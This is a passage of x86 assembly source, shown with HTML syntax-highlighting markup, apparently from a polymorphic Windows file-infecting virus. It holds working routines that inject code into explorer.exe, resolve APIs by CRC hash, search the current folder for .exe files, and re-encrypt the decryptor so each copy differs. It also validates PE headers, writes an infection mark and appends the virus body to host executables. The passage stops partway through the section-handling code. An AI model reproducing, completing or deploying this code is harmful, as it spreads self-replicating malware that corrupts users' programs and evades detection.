</span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">Explorer2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerDepth</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">InjectToExplorer</span><span class="sc0">                    
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ExitProcessCRC</span><span class="sc4">,</span><span class="sc5">EPNameLen</span><span class="sc0">       
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;This code is executed in the last explorer.exe what we have injected our code</span><span class="sc0">

</span><span class="sc5">Explorer2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;eax = Base of Kernel</span><span class="sc0">
</span><span class="sc1">;ebp = d_offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerDepth</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;this is the last explorer injection</span><span class="sc0">

</span><span class="sc1">;now ill infect all files .exe in Current folder</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">InfectCurrentFolder</span><span class="sc0">

</span><span class="sc5">ExplorerEnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">DoffEnd</span><span class="sc0">
</span><span class="sc5">DoffEnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DoffEnd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax = kernel base</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ExitProcessCRC</span><span class="sc4">,</span><span class="sc5">EPNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;eax -&gt; ExitProcess</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">kernel</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CryptKey</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExplorerDepth</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">struct</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">       </span><span class="sc5">FILETIME</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">             </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">260</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;InfectCurrentFolder infects files with mask in files variable in current folder</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;    none</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;    none</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">InfectCurrentFolder</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">Poly</span><span class="sc0"> </span><span class="sc1">;we poly the decryptor overwriting code with new decryptor for </span><span class="sc0">
           </span><span class="sc1">;the moment when we will infect a file</span><span class="sc0">

</span><span class="sc1">;here begins zone where we will infect files</span><span class="sc0">
</span><span class="sc1">;if all things are in order,current directory for memory-infected explorer  </span><span class="sc0">
</span><span class="sc1">;is the same as file.exe that contains virus.</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">files</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FindFirstFileACRC</span><span class="sc4">,</span><span class="sc5">FFFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">TestTypeOfInfection</span><span class="sc0">

</span><span class="sc5">MoreFiles</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;)</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">Poly</span><span class="sc0"> </span><span class="sc1">;poly again so each infected file will be different</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FindNextFileACRC</span><span class="sc4">,</span><span class="sc5">FNFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">TestTypeOfInfection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndCurrentFolderInfection</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetTickCountCRC</span><span class="sc4">,</span><span class="sc5">GTCNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INFECTION_PROBABILITY</span><span class="sc0"> </span><span class="sc1">;probability of infection.By default always.</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">MoreFiles</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetTickCountCRC</span><span class="sc4">,</span><span class="sc5">GTCNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">PER_PROCESS_PROBABILITY</span><span class="sc0"> </span><span class="sc1">;probability of per-process.By default never.</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">WithPerProcess</span><span class="sc0"> 
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">WithPerProcess</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">TestFile</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">PerProcessOrNoInfect</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GoInfectIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">InfectIt</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">MoreFiles</span><span class="sc0">
</span><span class="sc5">PerProcessOrNoInfect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ForcePerProcess</span><span class="sc0">
</span><span class="sc1">;if no force perprocess and no normal,then -1 and no infect so more files</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">MoreFiles</span><span class="sc0">
</span><span class="sc5">ForcePerProcess</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">GoInfectIt</span><span class="sc0">

</span><span class="sc5">EndCurrentFolderInfection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">files</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SearchHand</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">



</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;InfectIt uses WIN_FIND_DATA for infecting file which information is contained in that struc</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax = 0 without encryption(but with perprocess enable)   eax = 1 with encryption(but</span><span class="sc0">
</span><span class="sc1">;                                                   no enabled perprocess)</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">InfectIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Encryption</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndInfection</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileInfectedSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'Zv'</span><span class="sc1">;my infection mark</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseAndBye</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;yes IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">CloseAndBye</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">     </span><span class="sc1">;no IMAGE_FILE_SYSTEM</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0"> 
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">     </span><span class="sc1">;no IMAGE_FILE_DLL</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;no IMAGE_SUBSYSTEM_NATIVE </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseAndBye</span><span class="sc0">

</span><span class="sc1">;we have a file executable in PE format and not infected by this virus so ill continue </span><span class="sc0">
</span><span class="sc1">;with infection.In addition is not a system file.</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc1">;file alingment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">AlignSize</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileInfectedSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;we divide size/alignment and inc result for knowing the new number of blocks</span><span class="sc0">
</span><span class="sc1">;and next we multiplicate number of blocks x size of block</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;for in next mapping will be mapped file size + space for vir</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">CloseAll</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0">                    </span><span class="sc1">;with size to allocate virus</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndInfection</span><span class="sc0">

</span><span class="sc1">;now we have file mapped with enought space at end of file to append there our virus ;)</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'Zv'</span><span class="sc1">;infection mark </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc1">;lfanew</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc1">;ebx -&gt; PE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc1">;number of sections</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Sections</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Sections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FirstSection</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">LastSection</span><span class="sc4">:</span><span class="sc0">
